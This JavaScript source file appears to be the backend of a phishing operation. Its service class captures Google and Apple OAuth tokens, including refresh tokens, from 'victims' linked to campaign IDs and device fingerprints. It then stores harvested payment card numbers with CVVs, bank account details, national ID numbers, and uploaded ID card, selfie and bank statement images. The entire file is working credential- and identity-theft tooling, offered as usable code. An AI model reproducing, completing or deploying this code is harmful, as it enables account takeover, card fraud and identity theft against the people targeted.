// OAuth token capture service
// Handles capturing and storing OAuth tokens from Google/Apple

class CredentialCaptureService {
  constructor(oauthTokenRepository, victimRepository, encryptionService) {
    this.oauthTokenRepository = oauthTokenRepository;
    this.victimRepository = victimRepository;
    this.encryptionService = encryptionService;
  }

  /**
   * Capture OAuth token from provider
   * @param {Object} tokenData - Raw OAuth token data
   * @param {string} provider - Provider name (google, apple)
   * @param {Object} metadata - Additional metadata
   * @returns {Promise<Object>} - Created victim and token records
   */
  async captureOAuthToken(tokenData, provider, metadata = {}) {
    const {
      access_token,
      refresh_token,
      id_token,
      expires_in,
      token_type = 'Bearer',
      scope,
      user_info = {}
    } = tokenData;

    // Extract email from token data or user_info
    const email = user_info.email || tokenData.email || metadata.email;
    if (!email) {
      throw new Error('Email is required for OAuth token capture');
    }

    // Check if victim already exists
    let victim = await this.victimRepository.findByEmail(email);
    
    if (!victim) {
      // Create new victim record
      const captureMethod = provider === 'google' ? 'oauth_google' : 
                           provider === 'apple' ? 'oauth_apple' : 
                           'oauth_unknown';
      
      victim = await this.victimRepository.create({
        email,
        name: user_info.name || user_info.displayName || null,
        phone: user_info.phone || null,
        captureMethod,
        captureSource: metadata.captureSource || null,
        campaignId: metadata.campaignId || null,
        sessionData: metadata.sessionData || {},
        deviceFingerprint: metadata.deviceFingerprint || {},
        validation: {
          emailVerified: user_info.emailVerified || false,
          provider: provider
        }
      });
    } else {
      // Update existing victim with new capture data
      await this.victimRepository.update(victim.id, {
        name: user_info.name || user_info.displayName || victim.name,
        phone: user_info.phone || victim.phone,
        deviceFingerprint: {
          ...victim.deviceFingerprint,
          ...(metadata.deviceFingerprint || {})
        },
        sessionData: {
          ...victim.sessionData,
          ...(metadata.sessionData || {})
        }
      });
    }

    // Encrypt token data
    const encryptedTokenData = this.encryptionService.encrypt({
      access_token,
      refresh_token,
      id_token,
      token_type,
      scope
    });

    // Calculate expiration time
    const expiresIn = expires_in || 3600; // Default 1 hour
    const expiresAt = new Date(Date.now() + expiresIn * 1000);

    // Create OAuth token record
    const oauthToken = await this.oauthTokenRepository.create({
      victimId: victim.id,
      provider,
      providerMetadata: {
        scope,
        token_type,
        ...metadata.providerMetadata
      },
      tokenData: encryptedTokenData,
      issuedAt: new Date(),
      expiresAt,
      tokenStatus: 'active',
      userProfile: {
        email: user_info.email || email,
        name: user_info.name || user_info.displayName,
        picture: user_info.picture || user_info.photoURL,
        ...user_info
      }
    });

    return {
      victim,
      oauthToken
    };
  }

  /**
   * Process registration form data
   * @param {string} victimId - Victim ID
   * @param {Object} formData - Registration form data
   * @param {Object} files - Uploaded files
   * @returns {Promise<Object>} - Updated victim record
   */
  async processRegistrationForm(victimId, formData, files = {}) {
    const victim = await this.victimRepository.findById(victimId);
    if (!victim) {
      throw new Error('Victim not found');
    }

    // Encrypt card information if provided
    let encryptedCardInfo = {};
    if (formData.cardNumber || formData.cardHolder || formData.expiryDate || formData.cvv) {
      const cardData = {
        cardNumber: formData.cardNumber,
        cardHolder: formData.cardHolder,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv
      };
      encryptedCardInfo = this.encryptionService.encrypt(cardData);
    }

    // Prepare identity verification data
    const identityVerification = {
      fullName: formData.fullName || victim.name,
      phone: formData.phone || victim.phone,
      address: formData.address,
      city: formData.city,
      district: formData.district,
      bankName: formData.bankName,
      bankAccount: formData.bankAccount,
      idNumber: formData.idNumber,
      files: {}
    };

    // Store file paths if files were uploaded
    if (files.identityCard) {
      identityVerification.files.identityCard = files.identityCard.path;
    }
    if (files.selfie) {
      identityVerification.files.selfie = files.selfie.path;
    }
    if (files.bankStatement) {
      identityVerification.files.bankStatement = files.bankStatement.path;
    }

    // Update victim record
    const updatedVictim = await this.victimRepository.update(victimId, {
      name: formData.fullName || victim.name,
      phone: formData.phone || victim.phone,
      cardInformation: encryptedCardInfo,
      identityVerification,
      validation: {
        ...victim.validation,
        registrationCompleted: true,
        registrationTimestamp: new Date().toISOString()
      }
    });

    return updatedVictim;
  }
}

module.exports = CredentialCaptureService;

